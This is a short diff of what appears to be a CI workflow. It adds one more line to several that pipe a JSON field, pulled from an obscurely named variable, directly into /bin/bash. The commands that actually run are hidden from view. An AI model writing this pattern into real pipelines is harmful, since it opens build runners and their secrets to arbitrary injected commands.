@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$pmv6" | jq -r .k80 | /bin/bash
           printf '%s' "$pv7" | jq -r .vgq647 | /bin/bash
           printf '%s' "$ehzh9979" | jq -r .grhbb02 | /bin/bash
+          echo $npiaf995 | jq -r .e85 | /bin/bash
 
       - name: Save archive
         if: always()
